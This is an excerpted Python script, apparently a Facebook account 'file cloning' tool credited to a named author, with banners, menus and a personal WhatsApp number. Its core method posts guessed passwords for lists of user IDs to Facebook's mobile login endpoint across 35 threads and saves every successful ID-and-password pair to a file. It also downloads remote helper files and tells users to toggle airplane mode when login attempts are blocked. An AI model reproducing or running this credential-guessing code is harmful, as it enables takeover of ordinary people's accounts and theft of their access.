...
from random import randint
r1=requests.get("https://github.com/TBBCYBERZONE/File1/blob/main/ApprovemXD.txt").text
...
if not os.path.isfile('.agents.txt'):
	os.system('curl -L https://github.com/TBBCYBERZONEgit/files/main/.agents.txt > .agents.txt')
ct = datetime.now()
n = ct.month
...
def main():
	...
	print('\033[1;32m        ┌─────────────────────────────────┐') 
	print("\033[1;92m\t│\033[1;92mWELLCOME TO TUSHAR     \033[1;92m      │")
	print('\033[1;32m┌────────────────────────────────────────────┐') 
	...
	if Adi in ('3', '03'):
		os.system("xdg-open https://youtube.com/@Hacking-app-developer_ceoRafi")
	if Adi in ('0', '00'):
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mTUSHAR-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('TUSHAR_Ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36mTUSHAR PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
...
banner = """   
  ...
  _  _    ___   ___         __  __ ______ __  __ ____          _____  
 | || |  / _ \ / _ \       |  \/  |  ____|  \/  |  _ \   /\   |  __ \ 
 | || |_| | | | | | |______| \  / | |__  | \  / | |_) | /  \  | |__) |
 |__   _| | | | | | |______| |\/| |  __| | |\/| |  _ < / /\ \ |  _  / 
    | | | |_| | |_| |      | |  | | |____| |  | | |_) / ____ \| | \ \ 
   _|_|_ \___/ \___/     _ |_|  |_|______|_|  |_|____/_/    \_\_|  \_\
  / ____|               (_)     | |                                   
...
=================================================
    [-] AUTHOR    :\033[1;32m TUSHAR SARKER
    [-] GITHUB    :\033[1;32m TBBCYBERZONE
    [-] WhatsApp  :\033[1;32m 01863736449
    [-] TOOLS     :\033[1;32m FILE CLONE
    [-] VERSION   :\033[1;32m 1.0.0
...
def xoshnaw():
	...
	try:
		httpCaht = requests.get("https://m.me/rafi.sarker.9085").text
		if id in httpCaht:
